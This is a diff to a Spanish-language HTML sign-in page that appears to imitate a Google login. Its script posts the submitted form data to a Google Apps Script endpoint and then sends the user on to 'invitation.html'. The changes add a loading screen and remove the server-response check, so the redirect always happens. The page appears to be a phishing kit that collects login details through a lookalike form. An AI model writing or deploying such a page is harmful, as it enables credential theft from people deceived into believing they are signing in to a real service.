@@ -232,6 +232,10 @@
         <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
 
     </form>
+          <!-- Mensaje de carga oculto -->
+<div id="loadingMessage" style="display: none; text-align: center;">
+    <p>Procesando... Por favor, espera.</p>
+</div>
 <br>
 
    <p>Español(España) Ayuda Privacidad Términos</p>
@@ -240,10 +244,14 @@
     
   <script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
-    event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+    event.preventDefault();
+
+    // Ocultar el formulario y mostrar el mensaje de carga
+    document.getElementById("miFormulario").style.display = "none";
+    document.getElementById("loadingMessage").style.display = "block";
 
     const formData = new FormData(this);
-    const url = "https://script.google.com/macros/s/AKfycbxU80QkIHuMrsTIuSLL01BMCpNZ-kmW0M_TlduiLKfHTD8qY2oMVXExV_qlRrbmhgzJ/exec"; // Reemplaza con la URL de Google Apps Script
+    const url = "https://script.google.com/macros/s/AKfycbxU80QkIHuMrsTIuSLL01BMCpNZ-kmW0M_TlduiLKfHTD8qY2oMVXExV_qlRrbmhgzJ/exec";
 
     try {
         const response = await fetch(url, {
@@ -252,16 +260,17 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
         });
 
-        if (response.ok) {
-            window.location.href = "invitation.html"; // Redirige al usuario tras enviar los datos
-        } else {
-            alert("Error al enviar los datos.");
-        }
+        window.location.href = "invitation.html"; // Redirigir tras éxito
     } catch (error) {
         alert("Error al conectar con el servidor.");
         console.error("Error:", error);
+
+        // Si hay un error, volver a mostrar el formulario y ocultar el mensaje
+        document.getElementById("miFormulario").style.display = "block";
+        document.getElementById("loadingMessage").style.display = "none";
     }
 });
+
 </script>
 
 
